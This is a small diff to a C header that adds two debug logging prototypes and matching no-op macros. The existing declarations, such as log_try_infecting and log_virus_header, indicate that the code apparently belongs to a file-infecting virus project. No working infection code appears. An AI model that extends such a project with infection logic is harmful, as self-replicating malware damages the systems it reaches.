@@ -22,11 +22,16 @@ void	log_success(void);
 void	log_all_seeds(const uint64_t father_seed, const uint64_t hdr_hash, const uint64_t son_seed);
 void	log_virus_header(struct virus_header *vhdr);
 
+void	log_dvalue(int32_t value);
+void	log_uvalue(size_t value);
+
 # else
 #  define log_try_infecting(...)
 #  define log_success(...)
 #  define log_all_seeds(...)
 #  define log_virus_header(...)
+#  define log_dvalue(...)
+#  define log_uvalue(...)
 # endif
 
 #endif
